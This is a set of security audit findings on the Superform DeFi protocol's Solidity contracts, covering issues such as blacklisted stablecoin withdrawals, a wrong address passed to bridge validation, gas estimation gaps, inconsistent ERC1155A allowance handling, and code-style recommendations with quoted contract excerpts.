The identified concern stems from the implementation of address blacklisting by tokens such as USDT/USDC. The issue manifests when a user (referred to as Person A) initiates a fund deposit into Superform. Subsequently, if the user's address is blacklisted, a predicament arises wherein the user faces impediments in withdrawing their funds through the customary method of burning **Superpositions**. This scenario effectively leads to a situation where the user's funds become entangled within the Superform contract, rendering them inaccessible. The intricacies of this issue underscore the importance of addressing it promptly to ensure the seamless functionality and security of the Superform platform for all users.

- **Vulnerability Details:**
**Description:**
The USDC/USDT blocklist feature is susceptible to abuse, particularly when used against users attempting to withdraw funds. If a user's address is blacklisted after depositing funds, any attempt to withdraw by burning their Superpositions is prevented due to the blacklisting.

**Proof of Concept (PoC):**
1. Person A deposits $1k in the Superform contract.
2. Person A's address is blacklisted, making transfers to and from that address forbidden.
3. Person A attempts to withdraw by burning their Superpositions.
4. The withdrawal is unsuccessful due to the address being blacklisted, effectively trapping Person A's funds within the Superform contract.

- **Impact:**
The identified vulnerability has severe consequences for affected users, as it results in the inability to withdraw funds. This could lead to financial losses and frustration for users attempting to access their deposited funds.

- **Tools Used:**
- Manual code review

- **Recommendations:**
1. **Withdrawal Mechanism Enhancement:**
   - Implement alternative withdrawal mechanisms that allow users to retrieve their funds even if the normal transfer function is restricted due to blacklisting.

2. **Transparent Communication:**
   - Clearly document and communicate the address blacklisting mechanism to users.
   - In the event of blacklisting, communicate transparently with the community about the reasons and potential resolutions.

3. **User Education:**
   - Provide users with information about the potential risks associated with blacklisting and the circumstances under which it might occur. or maybe handle the blacklisted address on frontend.




### `finalizePayload` validates the wrong address for the `srcSender`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


- Impact

The `finalizePayload` function in the given smart contract contains a critical flaw related to the validation of transaction data (`txData_`) in cross-chain deposit scenarios. The function erroneously uses the receiver's address for validation when it should be using the sender's address from the source chain (`srcSender`). This incorrect validation would lead to issues in verifying the authenticity and integrity of the cross-chain transactions when the `receivingAddress` is not `srcSender`.

- Proof of Concept

Take a look at [TimelockStateRegistry.sol#L119-L199](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L119-L199)

```solidity
function finalizePayload(
    uint256 timeLockPayloadId_,
    bytes memory txData_
)
    external
    payable
    override
    onlyTimelockStateRegistryProcessor
{
    // ... [omitted code for brevity]

    IBridgeValidator bridgeValidator = IBridgeValidator(superRegistry.getBridgeValidator(p.data.liqData.bridgeId));

    // ... [omitted code for brevity]

    if (txData_.length != 0) {
        // ... [omitted code for brevity]

        bridgeValidator.validateTxData(
            IBridgeValidator.ValidateTxDataArgs(
                txData_,
                CHAIN_ID,
                p.srcChainId,
                p.data.liqData.liqDstChainId,
                false,
                superform,
                p.data.receiverAddress, // @audit
                p.data.liqData.token,
                address(0)
            )
        );

    // ... [omitted code for brevity]
}
```

Now, according to bridge validator this should be the instance of `p.data.receiverAddress` in the struct should be `srcsender` instead, as can be seen [here](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/interfaces/IBridgeValidator.sol#L18);

```solidity
    struct ValidateTxDataArgs {
        bytes txData;
        uint64 srcChainId;
        uint64 dstChainId;
        uint64 liqDstChainId;
        bool deposit;
        address superform;
        address srcSender;//@audit
        address liqDataToken;
        address liqDataInterimToken;
    }
```

As previously explained in the _Impact_ section of report, this would lead to wrongly validating the tx data for the transaction, essentially causing a DOS for all instances where the `srcAdress != p.data.receiverAddress` since the tx would always revert.

- Tool Used

Manual Review

- Recommended Mitigation Steps

Replace `p.data.receiverAddress` with the appropriate sender's address in the `validateTxData` call.




### Use `internal` where possible

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


- **Severity**
**Low**

- **Relevant GitHub Links**
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L490-L497

https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L265-L272

- **Summary**
This is a low-severity issue related to the visibility of certain functions. Specifically, the functions `validateSlippage` in the `CoreStateRegister` contract and `nonblockingLzReceive` in the `LayerzeroImplementation` contract are currently marked as public, but they include a check to ensure that the caller is the contract itself. To improve security and gas efficiency, it is recommended to change the visibility of these functions to internal.

- **Vulnerability Details**
The issue involves certain functions being marked as public, even though there is a check within these functions to ensure that the caller is the contract itself (`msg.sender == address(this)`). While this check provides a level of access control, it is unnecessary if these functions are only intended to be called internally. Making these functions internal instead of public would eliminate the need for this redundant check.

- **Impact**
The impact of this issue is considered low. It does not pose an immediate security risk, but it introduces unnecessary gas costs and slightly increases the attack surface by allowing external entities to attempt calling these functions, even though such attempts would be reverted.

- **Tools Used**
- Manual review

- **Recommendations**
It is recommended to change the visibility of the following functions to `internal`:

1. **In CoreStateRegister Contract:**
    - `validateSlippage` function

2. **In LayerzeroImplementation Contract:**
    - `nonblockingLzReceive` function

This adjustment will improve gas efficiency and security by explicitly restricting access to these functions to internal calls only.





### External call recipient may consume all transaction gas

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- [LOW] External call recipient may consume all transaction gas
- Number of instances found
 1

- Resolution
 When making external calls, the called contract can intentionally or unintentionally consume all provided gas, leading to unintended transaction reversion. To mitigate this risk, it's crucial to specify a gas limit when making the call. By using `addr.call{gas: <amount>}("")`, you allocate a specific amount of gas to the external call, ensuring the parent transaction has gas left for post-call operations. This approach safeguards against malevolent contracts aiming to exhaust gas and provides greater control over transaction execution.

- Findings
 Findings are labeled with ' <= FOUND'


<details><summary>Click to show findings</summary>



[LiquidityHandler.sol: 54-55](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L54)
```javascript

    function _dispatchTokens(
        address bridge_,
        bytes memory txData_,
        address token_,
        uint256 amount_,
        uint256 nativeAmount_
    )
        internal
        virtual
    {
        if (bridge_ == address(0)) {
            revert Error.ZERO_ADDRESS();
        }

        if (token_ != NATIVE) {
            IERC20 token = IERC20(token_);
            token.safeIncreaseAllowance(bridge_, amount_);
        } else {
            if (nativeAmount_ < amount_) revert Error.INSUFFICIENT_NATIVE_AMOUNT();
        }

        (bool success,) = payable(bridge_).call{ value: nativeAmount_ }(txData_); // <= FOUND
        if (!success) revert Error.FAILED_TO_EXECUTE_TXDATA(token_);
    }

```


</details>



### Lack of consideration for refund failed deposit gas cost when estimate gas price

**Severity:** Informational

**Context:** [PaymentHelper.sol#L169-L170](superform-core/src/payments/PaymentHelper.sol#L169-L170)

- lack of consideration for refund failed deposit gas cost when estimate gas price

**Description**

when estimate the gas cost

```solidity
if (isDeposit_) {
	/// @dev step 2: estimate update cost (only for deposit)
	totalDstGas += _estimateUpdateCost(req_.dstChainIds[i], superformIdsLen);

	/// @dev step 3: estimation processing cost of acknowledgement
	/// @notice optimistically estimating. (Ideal case scenario: no failed deposits / withdrawals)
	srcAmount += _estimateAckProcessingCost(superformIdsLen);
```

the estimation optimistically assume there is no faield deposit

however, in the case when there are failed deposit

the operator has to propose recovered amount,

then if refund receiver dispute the refund amonut

the operator may has to repropose again

these gas cost if not covered by user, will be covered by protocol, which would cause consistently lose of fund in gas

**Recommendation**

add gas overhead for failed deposit / withdraw to let user cover the gas cost for proposing the refund amount



### Superform protocol doesn't support vaults if their underlying asset is native token

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

- The protocol allows any vault owner from adding their vaults to the protocol by wrapping it to one of the approved form Implementations, and these vaults can have any type of underlying assets including native tokens.

- But it was noticed that [`ERC4626FormImplementation._processDirectDeposit`](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L156C5-L244C6) doesn't support depositing in vaults with native token (ETH) as it doesn't handle the case where `address(token) == NATIVE && singleVaultData_.liqData.txData.length == 0`:

```javascript
function _processDirectDeposit(InitSingleVaultData memory singleVaultData_) internal returns (uint256 dstAmount) {
        directDepositLocalVars memory vars;

        IERC4626 v = IERC4626(vault);
        vars.asset = address(asset);
        vars.balanceBefore = IERC20(vars.asset).balanceOf(address(this));
        IERC20 token = IERC20(singleVaultData_.liqData.token);

        if (address(token) != NATIVE && singleVaultData_.liqData.txData.length == 0) {
            /// @dev this is only valid if token == asset (no txData)
            if (singleVaultData_.liqData.token != vars.asset) revert Error.DIFFERENT_TOKENS();

            /// @dev handles the asset token transfers.
            if (token.allowance(msg.sender, address(this)) < singleVaultData_.amount) {
                revert Error.DIRECT_DEPOSIT_INSUFFICIENT_ALLOWANCE();
            }

            /// @dev transfers input token, which is the same as vault asset, to the form
            token.safeTransferFrom(msg.sender, address(this), singleVaultData_.amount);
        }

        /// @dev non empty txData means there is a swap needed before depositing (input asset not the same as vault
        /// asset)
        if (singleVaultData_.liqData.txData.length != 0) {
            vars.bridgeValidator = superRegistry.getBridgeValidator(singleVaultData_.liqData.bridgeId);

            vars.chainId = CHAIN_ID;

            vars.inputAmount =
                IBridgeValidator(vars.bridgeValidator).decodeAmountIn(singleVaultData_.liqData.txData, false);

            if (address(token) != NATIVE) {
                /// @dev checks the allowance before transfer from router
                if (token.allowance(msg.sender, address(this)) < vars.inputAmount) {
                    revert Error.DIRECT_DEPOSIT_INSUFFICIENT_ALLOWANCE();
                }

                /// @dev transfers input token, which is different from the vault asset, to the form
                token.safeTransferFrom(msg.sender, address(this), vars.inputAmount);
            }

            IBridgeValidator(vars.bridgeValidator).validateTxData(
                IBridgeValidator.ValidateTxDataArgs(
                    singleVaultData_.liqData.txData,
                    vars.chainId,
                    vars.chainId,
                    vars.chainId,
                    true,
                    address(this),
                    msg.sender,
                    address(token),
                    address(0)
                )
            );

            _dispatchTokens(
                superRegistry.getBridgeAddress(singleVaultData_.liqData.bridgeId),
                singleVaultData_.liqData.txData,
                address(token),
                vars.inputAmount,
                singleVaultData_.liqData.nativeAmount
            );

            if (
                IBridgeValidator(vars.bridgeValidator).decodeSwapOutputToken(singleVaultData_.liqData.txData)
                    != vars.asset
            ) {
                revert Error.DIFFERENT_TOKENS();
            }
        }

        vars.assetDifference = IERC20(vars.asset).balanceOf(address(this)) - vars.balanceBefore;

        /// @dev the difference in vault tokens, ready to be deposited, is compared with the amount inscribed in the
        /// superform data
        if (vars.assetDifference < singleVaultData_.amount) {
            revert Error.DIRECT_DEPOSIT_INVALID_DATA();
        }

        /// @dev notice that vars.assetDifference is deposited regardless if txData exists or not
        /// @dev this presumes no dust is left in the superform
        IERC20(vars.asset).safeIncreaseAllowance(vault, vars.assetDifference);

        if (singleVaultData_.retain4626) {
            dstAmount = v.deposit(vars.assetDifference, singleVaultData_.receiverAddress);
        } else {
            dstAmount = v.deposit(vars.assetDifference, address(this));
        }
    }
```

- Recommendation

Update this function to account for the un-handelled case.




### Inconsistent minting process

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:
in the same chain deposits the one that mints and burns the supershares is the router while in the crosschain ones is the state registry the one doing it, resulting in a less cleaner design.

**Recommendation**:
Perform all the actions from a same type of contract



### Type `uint8` for `bridgeId` may be too low

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**

Assuming that the Superform protocol is meant to operate forever once it has been deployed, it seems plausible that it could one day exceed the maximum of 250 supported bridges (implicitly enforced by storing `bridgeId` as a `uint8`). There is no mechanism for reusing a deprecated `bridgeId`, so the protocol would not necessarily need to support 250 bridges concurrently at any single time to hit this limit.

It is difficult to predict the rate of growth of EVM-based layer two networks,  but it would be reasonable to account for the possibility that it may become very high in the coming years. With this growth would come the death of some bridges, the birth of many new ones, and potentially unexpected permutations, like chain-specific or even application-specific bridges.

**Recommendation**

Considering the low cost of increasing the storage capacity of this variable contrasted with the high impact to the protocol if this limit is ever reached, it is likely worth making `bridgeId` a larger `uint`.



### Array indicies should be referenced via enums rather than via numeric literals

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Create a commented enum value to use instead of constant array indexes, this makes the code far easier to understand

*Instances (32)*:

```solidity
File: superform-core/src/BaseRouterImplementation.sol

185:         superformIds[0] = req_.superformData.superformId;

388:         superformIds[0] = req_.superformData.superformId;

966:         address token = vaultData_.liqData[0].token;

```

[185](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L185), [388](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L388), [966](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L966)

```solidity
File: superform-core/src/crosschain-data/BaseStateRegistry.sol

161:         _getAMBImpl(ambIds_[0]).dispatchPayload{ value: d.gasPerAMB[0] }(

161:         _getAMBImpl(ambIds_[0]).dispatchPayload{ value: d.gasPerAMB[0] }(

165:             d.extraDataPerAMB[0]

173:                 if (ambIds_[i] == ambIds_[0]) {

```

[161](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L161), [161](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L161), [165](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L165), [173](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L173)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

101:             (prevPayloadBody, finalState) = _updateSingleDeposit(payloadId_, prevPayloadBody, finalAmounts_[0]);

619:             singleVaultData.liqData.txData = txData_[0];

```

[101](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L101), [619](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L619)

```solidity
File: superform-core/src/crosschain-data/utils/PayloadHelper.sol

283:             amounts[0] = rsd.amount;

323:             amounts[0] = isvd.amount;

326:             slippages[0] = isvd.maxSlippage;

329:             superformIds[0] = isvd.superformId;

331:             hasDstSwaps[0] = isvd.hasDstSwap;

403:         bridgeIds[0] = isvd.liqData.bridgeId;

406:         txDatas[0] = isvd.liqData.txData;

409:         tokens[0] = isvd.liqData.token;

412:         liqDstChainIds[0] = isvd.liqData.liqDstChainId;

418:             amountsIn[0] =

419:                 IBridgeValidator(superRegistry.getBridgeValidator(bridgeIds[0])).decodeAmountIn(txDatas[0], false);

419:                 IBridgeValidator(superRegistry.getBridgeValidator(bridgeIds[0])).decodeAmountIn(txDatas[0], false);

423:         nativeAmounts[0] = isvd.liqData.nativeAmount;

```

[283](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L283), [323](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L323), [326](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L326), [329](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L329), [331](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L331), [403](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L403), [406](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L406), [409](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L409), [412](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L412), [418](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L418), [419](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L419), [419](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L419), [423](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L423)

```solidity
File: superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol

204:             sendingAssetId = swapData[0].sendingAssetId;

205:             amount = swapData[0].fromAmount;

252:         sendingAssetId = swapData[0].sendingAssetId;

253:         amount = swapData[0].fromAmount;

```

[204](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L204), [205](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L205), [252](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L252), [253](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L253)

```solidity
File: superform-core/src/libraries/ArrayCastLib.sol

12:         values[0] = value_;

18:         values[0] = value_;

27:         superformIds[0] = data_.superformId;

30:         amounts[0] = data_.amount;

33:         maxSlippage[0] = data_.maxSlippage;

36:         liqData[0] = data_.liqData;

```

[12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ArrayCastLib.sol#L12), [18](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ArrayCastLib.sol#L18), [27](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ArrayCastLib.sol#L27), [30](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ArrayCastLib.sol#L30), [33](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ArrayCastLib.sol#L33), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/ArrayCastLib.sol#L36)



### Double type casts create complexity within the code

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Double type casting should be avoided in Solidity contracts to prevent unintended consequences and ensure accurate data representation. Performing multiple type casts in succession can lead to unexpected truncation, rounding errors, or loss of precision, potentially compromising the contract's functionality and reliability. Furthermore, double type casting can make the code less readable and harder to maintain, increasing the likelihood of errors and misunderstandings during development and debugging. To ensure precise and consistent data handling, developers should use appropriate data types and avoid unnecessary or excessive type casting, promoting a more robust and dependable contract execution.

*Instances (5)*:

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

230:         return bytes32(uint256(uint160(addr_)));

```

[230](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L230)


```solidity
File: superform-core/src/libraries/DataLib.sol

24:         txInfo |= uint256(uint160(srcSender_)) << 32;

37:         srcSender = address(uint160(txInfo_ >> 32));

51:         superform_ = address(uint160(superformId_));

96:         superformId_ = uint256(uint160(superform_));

```

[24](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L24), [37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L37), [51](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L51), [96](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L96)




### Unused/empty `receive`/`fallback`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth)))`.

*Instances (4)*:

```solidity
File: superform-core/src/BaseForm.sol

159:     receive() external payable { }

```

[159](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L159)

```solidity
File: superform-core/src/BaseRouter.sol

46:     receive() external payable { }

```

[46](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouter.sol#L46)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

128:     receive() external payable { }

```

[128](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L128)

```solidity
File: superform-core/src/payments/PayMaster.sol

56:     receive() external payable { }

```

[56](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L56)



### Inconsistent implementation between `safeTransferFrom()` and `safeBatchTransferFrom()`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Summary
While checking allowances in `safeTransferFrom/safeBatchTransferFrom`, they use a different logic.

- Vulnerability Detail
In [safeTransferFrom()](https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L53), it deducts an individual allowance before checking a global `isApprovedForAll`.

```solidity
        if (operator == from) {
            /// @dev no need to self-approve
            /// @dev make transfer
            _safeTransferFrom(operator, from, to, id, amount, data);

            /// @dev operator allowance is higher than requested amount
        } else if (allowed >= amount) { //@audit inconsistent order
            /// @dev decrease allowance
            _decreaseAllowance(from, operator, id, amount);
            /// @dev make transfer
            _safeTransferFrom(operator, from, to, id, amount, data);

            /// @dev operator is approved for all tokens
        } else if (isApprovedForAll[from][operator]) {
            /// NOTE: We don't decrease individual allowance here.
            /// NOTE: Spender effectively has unlimited allowance because of isApprovedForAll
            /// NOTE: We leave allowance management to token owners

            /// @dev make transfer
            _safeTransferFrom(operator, from, to, id, amount, data);

            /// @dev operator is not an owner of ids or not enough of allowance, or is not approvedForAll
        } else {
            revert NOT_AUTHORIZED();
        }
```
So it spends the operator allowance although there is a global approval.

But [safeBatchTransferFrom()](https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L112) checks a global approval first.

```solidity
        /// @dev case to handle single id / multi id approvals
        if (msg.sender != from && !isApprovedForAll[from][msg.sender]) {
            singleApproval = true;
        }

        // Storing these outside the loop saves ~15 gas per iteration.
        uint256 id;
        uint256 amount;

        for (uint256 i; i < len; ++i) {
            id = ids[i];
            amount = amounts[i];

            if (singleApproval) {
                if (allowance(from, msg.sender, id) < amount) revert NOT_ENOUGH_ALLOWANCE();
                allowances[from][to][id] -= amount;
            }

            balanceOf[from][id] -= amount;
            balanceOf[to][id] += amount;
        }
```

As a result, operator allowances will be deducted differently with these 2 functions.

- Impact
Operator allowances will be deducted differently when there is a global approval.

- Code Snippet
https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L77

https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L129

- Tool used
Manual Review

- Recommendation
We should implement the same deduction logic for the above 2 functions.



### Missing checks in `constructor`/`initialize`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

There are some missing checks in these functions, and this could lead to unexpected scenarios. Consider always adding a sanity check for state variables.

*Instances (1)*:

```solidity
File: ERC1155A/src/aERC20.sol

/// @audit  decimals_
23:     constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) {
24:            ERC1155A = msg.sender;
25:            tokenDecimals = decimals_;
26:        }

```

[23-26](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L23-L26)



### Functions calling contracts with transfer hooks are missing reentrancy guards

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Even if the function follows the best practice of check-effects-interaction, not using a reentrancy guard when there may be transfer hooks will open the users of this protocol up to read-only reentrancies with no way to protect against it, except by block-listing the whole protocol.

*Instances (2)*:

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

/// @audit finalizeRescueFailedDeposits()
305:                 IERC20(failedDeposits_.settlementToken[i]).safeTransfer(
306:                         failedDeposits_.refundAddress, failedDeposits_.amounts[i]
307:                     );

```

[305-307](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L305-L307)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

/// @audit processFailedTx()
259:             IERC20(interimToken_).safeTransfer(user_, amount_);

```

[259](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L259)



### Adding a `return` statement when the function defines a named return variable, is redundant

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Once the return variable has been assigned (or has its default value), there is no need to explicitly return it at the end of the function, since it's returned automatically

*Instances (3)*:
<details>
<summary>see instances</summary>

```solidity
File: superform-core/src/crosschain-data/utils/PayloadHelper.sol

381:         return (bridgeIds, txDatas, tokens, liqDstChainIds, amountsIn, nativeAmounts);

425:         return (bridgeIds, txDatas, tokens, liqDstChainIds, amountsIn, nativeAmounts);

```

[381](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L381), [425](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L425)

```solidity
File: superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol

255:         return (sendingAssetId, amount, receiver, receivingAssetId, receivingAmount);

```

[255](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L255)




### Add inline comments for unnamed variables

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

```solidity

function foo(address x, address) -> function foo(address x, address /* y */)

```

*Instances (20)*:

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

/// @audit  parameter 3,
106:     function getConfig(
107:             uint16 version_,
108:             uint16 chainId_,
109:             address,
110:             uint256 configType_
111:         )
112:             external
113:             view
114:             returns (bytes memory)
115:         {

/// @audit  parameter 2,
305:     function _nonblockingLzReceive(uint16 _srcChainId, bytes memory, bytes memory _payload) internal {

```

[106-115](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L106-L115), [305](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L305)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

/// @audit  parameter 2,
99:     function estimateFees(
100:            uint64 dstChainId_,
101:            bytes memory,
102:            bytes memory extraData_
103:        )
104:            external
105:            view
106:            override
107:            returns (uint256 fees)
108:        {

/// @audit  parameter 1,
130:     function dispatchPayload(
131:             address, /*srcSender_*/
132:             uint64 dstChainId_,
133:             bytes memory message_,
134:             bytes memory extraData_
135:         )
136:             external
137:             payable
138:             virtual
139:             override
140:             onlyValidStateRegistry
141:         {

/// @audit  parameter 2,
171:     function receiveWormholeMessages(
172:             bytes memory payload_,
173:             bytes[] memory,
174:             bytes32 sourceAddress_,
175:             uint16 sourceChain_,
176:             bytes32 deliveryHash_
177:         )
178:             public
179:             payable
180:             override
181:             onlyRelayer
182:         {

```

